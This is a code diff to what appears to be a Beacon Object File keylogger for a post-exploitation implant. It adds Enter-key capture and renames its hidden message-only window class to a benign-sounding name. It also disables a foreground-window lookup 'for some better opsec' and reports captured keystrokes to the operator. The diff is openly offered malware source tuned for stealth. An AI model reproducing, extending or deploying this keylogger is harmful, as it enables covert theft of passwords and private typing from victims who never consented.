@@ -35,6 +35,13 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                             MSVCRT$memcpy(inputBuf + bufPos, bs, len);
                             bufPos += len;
                         }
+					} else if (vkey == VK_RETURN) {
+                        const char *ent = "[ENTER]";
+                        size_t len = MSVCRT$strlen(ent);
+                        if (bufPos + len < MAX_BUF - 1) {
+                            MSVCRT$memcpy(inputBuf + bufPos, ent, len);
+                            bufPos += len;
+                        }
                     } else if (vkey == VK_SPACE) {
                         if (bufPos < MAX_BUF - 1) {
                             inputBuf[bufPos++] = ' ';
@@ -82,7 +89,7 @@ int go(char *args, int len) {
 		
 	    // Register a dummy window class so Windows knows how to route messages to WndProc. 
 		HINSTANCE hInstance = KERNEL32$GetModuleHandleA(NULL);
-		const char CLASS_NAME[] = "ValuePattern_InputAudioClass";
+		const char CLASS_NAME[] = "Application-level-UIA-InputClass";
 		WNDCLASS wc = {0};
 		wc.lpfnWndProc   = WndProc;
 		wc.hInstance     = hInstance;
@@ -96,7 +103,7 @@ int go(char *args, int len) {
 		}
 
 		// Create a *message-only* window (HWND_MESSAGE) that never appears on-screen
-		HWND hwnd = USER32$CreateWindowExA(0, CLASS_NAME, "ValuePattern_InputAudio", 0,0,0,0,0, HWND_MESSAGE, NULL, hInstance, NULL);
+		HWND hwnd = USER32$CreateWindowExA(0, CLASS_NAME, "Application-level-UIA", 0,0,0,0,0, HWND_MESSAGE, NULL, hInstance, NULL);
 		if (!hwnd) {
 			BeaconPrintf(CALLBACK_OUTPUT, "CreateWindowEx failed\n");
 			return 1;
@@ -122,14 +129,14 @@ int go(char *args, int len) {
 		
 		// If available, print buffered input and free buffer (it doesn't call DestroyWindow and UnregisterClassA on purpose)
 		if (bufPos > 0) {
-			// disable GetForegroundWindow() for some better opsec
-			LPSTR windowsName[250];
-			int maxSizeName = 250;
-			HWND fg = USER32$GetForegroundWindow();
-			USER32$GetWindowTextA(fg, windowsName, maxSizeName);
+			// GetForegroundWindow() is disabled for some better opsec
+			//LPSTR windowsName[250];
+			//int maxSizeName = 250;
+			//HWND fg = USER32$GetForegroundWindow();
+			//USER32$GetWindowTextA(fg, windowsName, maxSizeName);
 			
-			BeaconPrintf(CALLBACK_OUTPUT, "[+] CAPTURED KEYSTROKES:\n[*] Current selected tab/window: %s\n================================================================================================================\n\n%s\n", windowsName, inputBuf);
-			//BeaconPrintf(CALLBACK_OUTPUT, "[+] CAPTURED KEYSTROKES:\n================================================================================================================\n\n%s\n", inputBuf);
+			//BeaconPrintf(CALLBACK_OUTPUT, "[+] CAPTURED KEYSTROKES:\n[*] Current selected tab/window: %s\n================================================================================================================\n\n%s\n", windowsName, inputBuf);
+			BeaconPrintf(CALLBACK_OUTPUT, "[+] CAPTURED KEYSTROKES:\n================================================================================================================\n\n%s\n", inputBuf);
 		} else {
 			BeaconPrintf(CALLBACK_OUTPUT, "[*] Keylogger is running.. no keystrokes captured jet.\n");
 		}
